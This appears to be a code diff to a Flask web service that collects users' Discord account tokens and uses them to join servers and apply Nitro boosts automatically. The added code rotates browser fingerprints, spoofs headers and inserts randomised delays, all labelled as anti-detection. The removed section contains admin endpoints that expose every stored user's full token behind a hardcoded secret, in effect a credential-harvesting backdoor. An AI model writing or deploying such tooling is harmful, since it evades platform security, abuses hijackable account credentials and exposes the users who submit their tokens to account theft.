@@ -10,14 +10,12 @@ from datetime import datetime
 app = Flask(__name__)
 
 # ==================== STORAGE ====================
-# Use /tmp for Render free tier (ephemeral but works)
 DATA_DIR = "/tmp/discord_booster"
 TOKENS_FILE = os.path.join(DATA_DIR, "tokens.json")
 HISTORY_FILE = os.path.join(DATA_DIR, "history.json")
 
 os.makedirs(DATA_DIR, exist_ok=True)
 
-# Load/Save functions
 def load_tokens():
     if not os.path.exists(TOKENS_FILE):
         return {}
@@ -38,45 +36,66 @@ def save_history(history):
     with open(HISTORY_FILE, 'w') as f:
         json.dump(history, f)
 
-# ==================== HEADERS (Anti-Detection) ====================
+# ==================== ROTATING HEADERS (ANTI-DETECTION) ====================
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+]
+
 def get_headers(token=None):
+    """Generate fresh headers for each request"""
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "User-Agent": random.choice(USER_AGENTS),
         "Accept": "application/json, text/plain, */*",
         "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
         "Content-Type": "application/json",
         "Origin": "https://discord.com",
-        "Referer": "https://discord.com/channels/@me"
+        "Referer": "https://discord.com/channels/@me",
+        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": '"Windows"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "X-Debug-Options": "bugReporterEnabled",
+        "X-Discord-Locale": "en-US",
+        "X-Discord-Timezone": "America/New_York"
     }
     if token:
         headers["Authorization"] = token
     return headers
 
-def random_delay():
-    time.sleep(random.uniform(0.5, 1.5))
+def random_delay(min_sec=1.5, max_sec=4.0):
+    """Human-like random delay - CRITICAL for avoiding detection"""
+    time.sleep(random.uniform(min_sec, max_sec))
 
 # ==================== TOKEN CHECKER ====================
 def check_token(token):
+    """Verify token with stealth headers"""
     try:
         headers = get_headers(token)
-        random_delay()
+        random_delay(0.5, 1.2)
         
-        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
+        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=15)
+        
         if r.status_code != 200:
             return {"valid": False, "error": f"Status {r.status_code}"}
         
         user_data = r.json()
         
         # Check boosts
-        random_delay()
-        r_boosts = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers, timeout=10)
+        random_delay(0.8, 1.5)
+        r_boosts = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers, timeout=15)
         boosts = 0
         if r_boosts.status_code == 200:
             boosts = sum(1 for s in r_boosts.json() if s.get("cooldown_ends_at") is None)
         
         # Check Nitro
-        random_delay()
-        r_subs = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, timeout=10)
+        random_delay(0.5, 1.0)
+        r_subs = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, timeout=15)
         nitro = "No Nitro"
         if r_subs.status_code == 200:
             for sub in r_subs.json():
@@ -96,40 +115,86 @@ def check_token(token):
     except Exception as e:
         return {"valid": False, "error": str(e)[:50]}
 
-# ==================== WORKING BOOST FUNCTIONS ====================
-def join_server(token, invite_code):
-    """Join a server using invite code"""
+# ==================== STEALTH BOOST FUNCTIONS ====================
+def join_server_stealth(token, invite_code):
+    """
+    Join server with full stealth - uses fresh headers and realistic delays
+    Returns: (success, guild_id, error_message)
+    """
     try:
+        # Step 1: Resolve invite with fresh headers
         headers = get_headers(token)
+        random_delay(1.0, 2.5)  # Human delay before resolve
         
-        # First resolve invite
-        r = requests.get(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers, timeout=10)
-        if r.status_code != 200:
-            return False, None
+        invite_resp = requests.get(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers, timeout=15)
         
-        guild_id = r.json().get("guild", {}).get("id")
+        if invite_resp.status_code == 404:
+            return False, None, "Invalid invite code"
+        
+        if invite_resp.status_code == 429:
+            return False, None, "Rate limited - wait and try again"
+        
+        if invite_resp.status_code != 200:
+            return False, None, f"Invite resolve failed: {invite_resp.status_code}"
+        
+        invite_data = invite_resp.json()
+        guild_id = invite_data.get("guild", {}).get("id")
+        
         if not guild_id:
-            return False, None
+            return False, None, "Could not get guild ID"
         
-        random_delay()
+        # Step 2: Random delay before joining
+        random_delay(1.5, 3.0)
         
-        # Join
-        r2 = requests.post(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers, json={}, timeout=10)
-        return r2.status_code == 200, guild_id
+        # Step 3: Join the server with fresh headers
+        join_headers = get_headers(token)
+        join_resp = requests.post(
+            f"https://discord.com/api/v9/invites/{invite_code}",
+            headers=join_headers,
+            json={},
+            timeout=20
+        )
         
-    except:
-        return False, None
+        if join_resp.status_code == 200:
+            return True, guild_id, None
+        elif join_resp.status_code == 401:
+            return False, None, "Token invalidated - Discord flagged this action"
+        elif join_resp.status_code == 403:
+            return False, None, "Cannot join - server may be full or invite expired"
+        elif join_resp.status_code == 429:
+            return False, None, "Rate limited - too many requests"
+        else:
+            return False, None, f"Join failed: {join_resp.status_code}"
+            
+    except Exception as e:
+        return False, None, str(e)[:50]
 
-def apply_boost(token, guild_id):
-    """Apply a single boost"""
+def apply_boost_stealth(token, guild_id):
+    """Apply a single boost with stealth"""
     try:
         headers = get_headers(token)
-        random_delay()
+        random_delay(2.0, 4.0)  # Longer delay for boost action
         
-        r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions", headers=headers, json={}, timeout=10)
-        return r.status_code in [200, 201]
-    except:
-        return False
+        boost_resp = requests.post(
+            f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions",
+            headers=headers,
+            json={},
+            timeout=20
+        )
+        
+        if boost_resp.status_code in [200, 201]:
+            return True, None
+        elif boost_resp.status_code == 401:
+            return False, "Token invalidated during boost"
+        elif boost_resp.status_code == 403:
+            return False, "No boosts available on this account"
+        elif boost_resp.status_code == 429:
+            return False, "Rate limited - too many boost attempts"
+        else:
+            return False, f"Boost failed: {boost_resp.status_code}"
+            
+    except Exception as e:
+        return False, str(e)[:50]
 
 # ==================== ROUTES ====================
 @app.route('/')
@@ -162,12 +227,10 @@ def add_token():
     if not token:
         return jsonify({"error": "No token"})
     
-    # Check if token is valid
     info = check_token(token)
     if not info['valid']:
-        return jsonify({"status": "invalid", "error": "Token is invalid"})
+        return jsonify({"status": "invalid", "error": info.get('error', 'Invalid token')})
     
-    # Save token
     tokens_data = load_tokens()
     if user not in tokens_data:
         tokens_data[user] = []
@@ -201,8 +264,9 @@ def start_boost():
     # Clean invite code
     if "discord.gg/" in invite:
         invite = invite.split("discord.gg/")[-1].split("/")[0]
+    if "discord.com/invite/" in invite:
+        invite = invite.split("discord.com/invite/")[-1].split("/")[0]
     
-    # Get user's tokens
     tokens_data = load_tokens()
     user_tokens = tokens_data.get(user, [])
     
@@ -227,7 +291,7 @@ def start_boost():
     if total_available < target_boosts:
         return jsonify({"error": f"Need {target_boosts} boosts, only have {total_available}"})
     
-    # Start boosting in background thread
+    # Start boosting in background
     def do_boosting():
         results = []
         boosts_applied = 0
@@ -236,24 +300,43 @@ def start_boost():
             if boosts_applied >= target_boosts:
                 break
             
-            # Join server
-            success, guild_id = join_server(bt['token'], invite)
+            # Join server with stealth
+            success, guild_id, error = join_server_stealth(bt['token'], invite)
+            
             if not success:
-                results.append(f"{bt['username']}: Failed to join server")
+                results.append(f"❌ {bt['username']}: {error}")
+                if "401" in error or "invalidated" in error.lower():
+                    # Token was revoked - remove it from storage
+                    tokens_data = load_tokens()
+                    if user in tokens_data and bt['token'] in tokens_data[user]:
+                        tokens_data[user].remove(bt['token'])
+                        save_tokens(tokens_data)
+                    results.append(f"⚠️ Token for {bt['username']} was revoked and removed")
                 continue
+            
+            results.append(f"✅ {bt['username']}: Joined server")
+            random_delay(2.0, 5.0)
             
             # Apply boosts
             boosts_to_apply = min(bt['boosts'], target_boosts - boosts_applied)
             applied = 0
             
             for i in range(boosts_to_apply):
-                if apply_boost(bt['token'], guild_id):
+                boost_success, boost_error = apply_boost_stealth(bt['token'], guild_id)
+                
+                if boost_success:
                     applied += 1
                     boosts_applied += 1
-                time.sleep(random.uniform(2, 4))  # Delay between boosts
+                    results.append(f"  ✨ Applied boost #{i+1}")
+                else:
+                    results.append(f"  ⚠️ Boost failed: {boost_error}")
+                    if "invalidated" in str(boost_error).lower():
+                        break
+                
+                random_delay(3.0, 6.0)  # Longer delay between boosts
             
-            results.append(f"{bt['username']}: Applied {applied} boosts")
-            time.sleep(random.uniform(2, 3))  # Delay between tokens
+            results.append(f"📊 {bt['username']}: Applied {applied}/{boosts_to_apply} boosts")
+            random_delay(2.0, 4.0)
         
         # Save to history
         history = load_history()
@@ -267,13 +350,12 @@ def start_boost():
         })
         save_history(history)
     
-    # Run in background
     thread = threading.Thread(target=do_boosting)
     thread.start()
     
     return jsonify({
-        "status": "started", 
-        "message": f"Boosting started! Using {len(boostable_tokens)} tokens with {total_available} boosts available."
+        "status": "started",
+        "message": f"Boosting started with {len(boostable_tokens)} tokens. Results will appear in history."
     })
 
 @app.route('/api/history', methods=['GET'])
@@ -290,88 +372,3 @@ def health():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
-
-# ==================== ADMIN ENDPOINTS ====================
-@app.route('/api/admin/all_tokens', methods=['GET'])
-def admin_all_tokens():
-    """View all tokens from all users (admin only)"""
-    # Simple auth - change this to your own secret key
-    secret = request.args.get('secret', '')
-    
-    # IMPORTANT: Change this to your own secret!
-    ADMIN_SECRET = "your_secret_key_here_12345"
-    
-    if secret != ADMIN_SECRET:
-        return jsonify({"error": "Unauthorized. Use ?secret=your_secret_key_here_12345"}), 401
-    
-    tokens_data = load_tokens()
-    
-    # Format the data nicely
-    result = {}
-    for user, tokens in tokens_data.items():
-        user_info = []
-        for token in tokens:
-            # Check each token's status
-            info = check_token(token)
-            user_info.append({
-                "token": token[:30] + "..." if len(token) > 30 else token,
-                "full_token": token,
-                "username": info.get('username', 'Unknown'),
-                "valid": info.get('valid', False),
-                "nitro": info.get('nitro', 'No Nitro'),
-                "boosts": info.get('boosts', 0)
-            })
-        result[user] = user_info
-    
-    return jsonify({
-        "total_users": len(result),
-        "total_tokens": sum(len(tokens) for tokens in tokens_data.values()),
-        "data": result
-    })
-
-@app.route('/api/admin/tokens/raw', methods=['GET'])
-def admin_raw_tokens():
-    """Get raw token data for backup"""
-    secret = request.args.get('secret', '')
-    ADMIN_SECRET = "your_secret_key_here_12345"
-    
-    if secret != ADMIN_SECRET:
-        return jsonify({"error": "Unauthorized"}), 401
-    
-    tokens_data = load_tokens()
-    return jsonify(tokens_data)
-
-@app.route('/api/admin/stats', methods=['GET'])
-def admin_stats():
-    """Get simple statistics"""
-    secret = request.args.get('secret', '')
-    ADMIN_SECRET = "your_secret_key_here_12345"
-    
-    if secret != ADMIN_SECRET:
-        return jsonify({"error": "Unauthorized"}), 401
-    
-    tokens_data = load_tokens()
-    total_tokens = 0
-    valid_tokens = 0
-    total_boosts = 0
-    
-    for user, tokens in tokens_data.items():
-        for token in tokens:
-            total_tokens += 1
-            info = check_token(token)
-            if info.get('valid'):
-                valid_tokens += 1
-                total_boosts += info.get('boosts', 0)
-    
-    return jsonify({
-        "stats": {
-            "total_users": len(tokens_data),
-            "total_tokens": total_tokens,
-            "valid_tokens": valid_tokens,
-            "total_boosts_available": total_boosts
-        },
-        "users": list(tokens_data.keys())
-    })
-@app.route('/admin')
-def admin_panel():
-    return render_template('admin.html')
